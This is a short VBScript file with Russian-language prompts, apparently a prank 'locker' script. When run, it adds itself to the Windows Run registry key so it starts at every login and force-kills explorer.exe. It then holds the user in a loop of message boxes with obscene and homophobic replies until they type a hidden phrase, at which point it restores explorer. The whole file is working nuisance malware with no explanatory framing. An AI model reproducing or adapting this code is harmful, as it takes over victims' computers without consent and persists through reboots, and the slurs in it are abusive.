CreateObject("WScript.Shell").RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Window", WScript.ScriptFullName
CreateObject("WScript.Shell").Run "taskkill /f /im explorer.exe"
Dim aa, ab
ab = 0
Do
  aa = MsgBox("Да или нет?", vbYesNo)
  If aa = 6 Then
    MsgBox "Пизда"
  ElseIf aa = 7 Then
    MsgBox "Пидора ответ"
  End If
  aa = MsgBox("Повторить?", vbRetryCancel)
  If aa = 2 Then
    MsgBox "Тогда введи!"
    CreateObject("SAPI.SpVoice").Speak "Своё имя с большой буквы"
    aa = InputBox("Поле для ввода")
    If aa = "Своё имя с большой буквы" Then
      MsgBox "Правильно! А теперь ответь на вопрос"
      aa = MsgBox ("Это закончиться когда-нибудь?", vbYesNo)
      If aa=6 Then
        MsgBox "И ты угадал"
        CreateObject("WScript.Shell").Run "explorer.exe"
        CreateObject("Scripting.FileSystemObject").DeleteFile "system.vbs"
        ab = 1
      End If
    Else
      MsgBox "Неправильно"
    End If
  End If
Loop Until ab = 1